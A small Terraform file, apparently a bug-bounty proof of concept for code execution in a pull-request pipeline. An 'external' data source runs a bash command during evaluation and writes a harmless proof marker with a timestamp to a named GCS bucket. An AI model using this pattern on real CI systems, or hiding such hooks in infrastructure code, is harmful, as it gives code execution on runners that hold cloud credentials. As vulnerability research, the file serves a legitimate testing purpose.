terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "default_v2_rce" {
  program = ["bash", "-c", "echo '{\"proof\": \"DEFAULT_CFG_V2_TOCTOU_COMMIT_B\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\"}'"]
}

resource "google_storage_bucket_object" "evil_v2" {
  name    = "im-pr-attack-test/evil-default-v2.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.default_v2_rce.result.proof
}

output "status" { value = "EVIL_COMMIT_B_DEFAULT_V2" }
output "rce" { value = data.external.default_v2_rce.result.proof }
